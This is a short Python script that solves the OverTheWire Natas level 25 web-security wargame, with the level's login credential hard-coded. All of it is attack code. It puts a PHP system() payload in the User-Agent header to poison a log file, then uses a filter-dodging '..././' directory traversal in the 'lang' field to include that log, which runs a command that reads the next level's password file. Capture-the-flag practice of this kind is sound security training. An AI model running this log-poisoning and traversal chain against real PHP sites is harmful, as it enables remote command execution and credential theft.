import requests
import re

# Constants

username = 'natas25'
password = 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'
URL = "http://natas25.natas.labs.overthewire.org/"
session = requests.Session()
headers={"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');?>"}

response=session.get(URL,auth=(username,password))

#print(session.cookies['PHPSESSID'])

response=session.post(URL,headers=headers, data ={"lang":"..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies['PHPSESSID'] +".log"  },auth=(username,password))
print(response.text)
